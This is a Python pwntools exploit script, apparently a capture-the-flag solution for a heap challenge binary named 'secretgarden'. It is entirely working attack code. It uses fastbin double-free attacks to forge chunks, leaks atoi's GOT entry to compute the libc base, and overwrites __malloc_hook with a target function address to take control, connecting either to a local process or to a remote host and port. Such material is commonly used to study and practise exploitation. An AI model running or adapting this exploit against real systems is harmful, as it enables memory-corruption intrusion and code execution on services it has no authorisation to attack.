from pwn import *

magic    = 0x400c7b
array    = 0x6020e0
atoi_got = 0x602080
atoi_off = 0x39ea0

def alloc(namelen, name, color):

	r.sendlineafter('choice : ', '1')
	r.sendlineafter('name :', str(namelen))

	if namelen < len(name):
		name += "\n"

	r.sendafter('flower :', name)
	r.sendlineafter('flower :', color)

	return

def free(idx):

	r.sendlineafter('choice :', '3')
	r.sendlineafter('garden:', str(idx))

	return

def dump():

	r.sendlineafter('choice :', '2')

	r.recvuntil('flower[7] :')

	return u64(r.recv(6).ljust(8, '\x00'))

def pwn():

	alloc(0x50, 'A'*8, 'red')    # chunk 0
	alloc(0x50, 'B'*8, 'green')  # chunk 1
	alloc(0x50, 'C'*8, 'orange') # chunk 2
	
	# Fastbin attack
	free(0)
	free(1)
	free(0)

	fast_chunk = 0x602102

	alloc(0x50, p64(fast_chunk), 'red')
	alloc(0x50, 'D'*8, 'red')
	alloc(0x50, 'E'*8, 'red')

	payload  = p8(0)*6
	payload += p64(0x602120)
	payload += p64(array)
	payload += p64(atoi_got)
	payload  = payload.ljust(0x50, '\x00')

	alloc(0x50, payload, 'red')

	# Leak atoi's address
	atoi        = dump()
	libc        = atoi - atoi_off
	malloc_hook = libc + 0x3c2740

	log.info("atoi: 		 0x{:x}".format(atoi))
	log.info("Libc: 		 0x{:x}".format(libc))
	log.info("__malloc_hook: 0x{:x}".format(malloc_hook))

	alloc(0x68, 'A'*8, 'red')    # chunk 10
	alloc(0x68, 'B'*8, 'green')  # chunk 11
	alloc(0x68, 'C'*8, 'orange') # chunk 12

	# Fastbin attack
	free(10)
	free(11)
	free(10)

	alloc(0x68, p64(malloc_hook - 0x30 + 0xd), 'red')
	alloc(0x68, 'D'*8, 'red')
	alloc(0x68, 'E'*8, 'red')
	# __malloc_hook => magic
	alloc(0x68, 'H'*0x13+p64(magic), 'yellow')	

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./secretgarden')
        pause()
        pwn()
